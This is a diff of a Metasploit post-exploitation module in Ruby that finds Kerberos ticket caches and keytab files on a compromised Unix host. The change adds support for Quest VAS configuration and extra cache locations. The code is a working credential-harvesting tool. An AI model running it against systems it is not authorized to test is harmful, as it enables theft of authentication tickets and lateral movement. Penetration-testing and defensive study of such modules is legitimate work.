@@ -31,6 +31,7 @@ require 'shellwords'
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
+  include Msf::Post::Common
 
   def initialize(info = {})
     super(
@@ -46,43 +47,48 @@ class MetasploitModule < Msf::Post
     )
     register_options([
       OptString.new('KRB_CONFIG_FILE', [true, 'The Kerberos config file.', '/etc/krb5.conf']),
+      OptString.new('VAS_CONFIG_FILE', [true, 'The VASD config file.', '/etc/opt/quest/vas/vas.conf']),
     ])
   end
 
   def run
     print_status('Finding files')
     files = [ '/etc/opt/quest/vas/host.keytab' ]
-    if file? datastore['KRB_CONFIG_FILE']
-      config = read_file(datastore['KRB_CONFIG_FILE'])
-      if /\n\s*default_ccache_name\s*=\s*(?<cache_location>.*?)\s*\n/ =~ config
-        if /^FILE:(?<file_pattern>.*%\{uid\}.*)/ =~ cache_location
-          suffix = ''
-        elsif /^DIR:(?<file_pattern>.*%\{uid\}.*)/ =~ cache_location
-          suffix = '/*'
-        elsif /^(?<storage>KEYRING|API|KCM|MEMORY|KSLSA):/ =~ cache_location
-          print_error("Kerberos ticket cache uses #{storage}. This module does not support this storage type.")
-        else
-          print_error("Unknown storage type: #{cache_location}")
+    configs = [datastore['KRB_CONFIG_FILE'], datastore['VAS_CONFIG_FILE']]
+    configs.each do |config_file|
+      if file? config_file
+        config = read_file(config_file)
+        if /\n\s*default_ccache_name\s*=\s*(?<cache_location>.*?)\s*\n/ =~ config || /\n\s*default_cc_name\s*=\s*(?<cache_location>.*?)\s*\n/ =~ config
+          if /^FILE:(?<file_pattern>.*%\{uid\}.*)/ =~ cache_location
+            suffix = ''
+          elsif /^DIR:(?<file_pattern>.*%\{uid\}.*)/ =~ cache_location
+            suffix = '/*'
+          elsif /^(?<storage>KEYRING|API|KCM|MEMORY|KSLSA):/ =~ cache_location
+            print_error("Kerberos ticket cache uses #{storage}. This module does not support this storage type.")
+          else
+            print_error("Unknown storage type: #{cache_location}")
+          end
+  
+          if file_pattern
+            print_status("Kerberos tickets configured to be stored at #{file_pattern}")
+            placeholder = 'MSF_INSERT_HERE'
+            # The krb5 pattern uses %{uid} as a wildcard. This is misinterpreted by Rubocop as a format string token
+            # rubocop: disable Style/FormatStringToken
+            file_pattern['%{uid}'] = placeholder
+            # rubocop: enable Style/FormatStringToken
+            # Need to do this two-step thing so Shellwords.escape doesn't escape the asterisk
+            file_pattern = Shellwords.escape(file_pattern)
+            file_pattern[placeholder] = '*'
+            files += cmd_exec("ls #{file_pattern}#{suffix}").split(/\r\n|\r|\n/)
+          end
         end
-
-        if file_pattern
-          print_status("Kerberos tickets configured to be stored at #{file_pattern}")
-          placeholder = 'MSF_INSERT_HERE'
-          # The krb5 pattern uses %{uid} as a wildcard. This is misinterpreted by Rubocop as a format string token
-          # rubocop: disable Style/FormatStringToken
-          file_pattern['%{uid}'] = placeholder
-          # rubocop: enable Style/FormatStringToken
-          # Need to do this two-step thing so Shellwords.escape doesn't escape the asterisk
-          file_pattern = Shellwords.escape(file_pattern)
-          file_pattern[placeholder] = '*'
-          files += cmd_exec("ls #{file_pattern}#{suffix}").split(/\r\n|\r|\n/)
-        end
+      else
+        vprint_warning("Could not find #{config_file}")
       end
-    else
-      print_error("Could not find #{datastore['KRB_CONFIG_FILE']}")
     end
     files += cmd_exec('ls /var/lib/sss/db/ccache_*').split(/\r\n|\r|\n/)
-    files += cmd_exec('ls /tmp/krb5_*').split(/\r\n|\r|\n/)
+    # Even though our config check should preclude this, it is a default location, so checking it may find something
+    files += cmd_exec('ls /tmp/krb5*').split(/\r\n|\r|\n/)
     files = files.uniq
     files = files.select { |d| file?(d) }
     if files.nil? || files.empty?
